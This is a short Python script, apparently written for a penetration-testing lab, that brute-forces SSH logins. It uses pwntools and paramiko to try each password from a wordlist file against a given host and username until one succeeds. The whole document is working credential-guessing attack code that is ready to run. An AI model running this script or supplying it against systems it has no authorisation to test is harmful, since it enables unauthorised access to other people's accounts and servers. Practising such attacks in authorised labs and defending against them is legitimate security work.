from pwn import *
import paramiko
import sys

host = sys.argv[1]
username = sys.argv[2]
#username = "kali"
#password = sys.argv[3]

attempts = 1

#with open("ssh-common-passwords.txt", "r") as passList:
with open("pass.txt", "r") as passList:
    for password in passList:
        password =  password.strip("\n")
        try:
            print(f"[{attempts}] Attempting pasword: '{password}'!")
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print(f"[>] Valid password found: '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
